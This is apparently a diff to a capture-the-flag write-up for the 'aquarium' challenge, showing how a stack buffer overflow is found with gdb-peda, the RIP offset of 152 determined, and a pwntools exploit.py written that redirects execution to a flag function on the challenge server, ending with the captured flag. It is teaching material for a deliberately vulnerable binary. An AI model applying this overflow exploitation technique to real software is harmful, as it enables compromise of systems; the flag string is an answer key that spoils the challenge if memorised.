@@ -80,4 +80,68 @@ int main() {
 $ gdb ./aquarium
   gdb-peda$ pattern create 200
   'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
+  
+  gdb-peda$ r
+  Enter the number of fish in your fish tank: 1000
+  Enter the size of the fish in your fish tank: 1000
+  Enter the amount of water in your fish tank: 1000
+  Enter the width of your fish tank: 1000
+  Enter the length of your fish tank: 1000
+  Enter the height of your fish tank: 1000
+  Enter the name of your fish tank: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
+  
+  [...]
+  RIP: 0x40138e (<create_aquarium+469>:	ret)
+  => 0x40138e <create_aquarium+469>:	ret  
+  Stopped reason: SIGSEGV
+  0x000000000040138e in create_aquarium ()
 ```
+#### Trying to input 200 bytes of random characters, we can be able to trigger the segfault error, but it seems that we don't have control of our rip register. But I have learned that we do have control over it, we just need to find at which offset we can do it. We do this by simply checking the content of the `rsp` register to get the offset then we proceed to verify our control.
+```
+gdb-peda$ x/wx $rsp
+0x7fffffffdd78:	0x41417041
+
+gdb-peda$ pattern offset 0x41417041
+1094807617 found at offset: 152
+
+gdb-peda$ r
+  [...]
+  Enter the name of your fish tank: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB
+  Stopped reason: SIGSEGV
+  0x0000424242424242 in ?? ()
+```
+#### And yea, there we have it we can control program flow with offset 152. But where do we want to jump to now? We've seen a flag function in the code, and that's where we want to jump to - thus we need it's address:
+```
+gdb-peda$ p flag
+$1 = {<text variable, no debug info>} 0x4011a6 <flag>
+```
+#### Then what we need for our exploit is complete, we now proceed to create our exploit script and run it against the server to get our flag.
+##### exploit.py
+```python
+from pwn import *
+
+#: Connect to challenge server
+HOST = 'shell.actf.co'
+PORT = 19305
+p = remote(HOST,PORT)
+# p = process('./aquarium')
+# print(p.recvline())
+
+#: Exploit code
+offset = 'A' * 152
+flag_addr = p32(0x4011a6)
+exploit = offset + flag_addr
+print(repr(exploit))
+
+#: Send payload
+p.sendline('1000')
+p.sendline('1000')
+p.sendline('1000')
+p.sendline('1000')
+p.sendline('1000')
+p.sendline('1000')
+p.sendline(exploit)
+print(p.recvline())
+```
+#### We got our flag! 
+`actf{overflowed_more_than_just_a_fish_tank}`
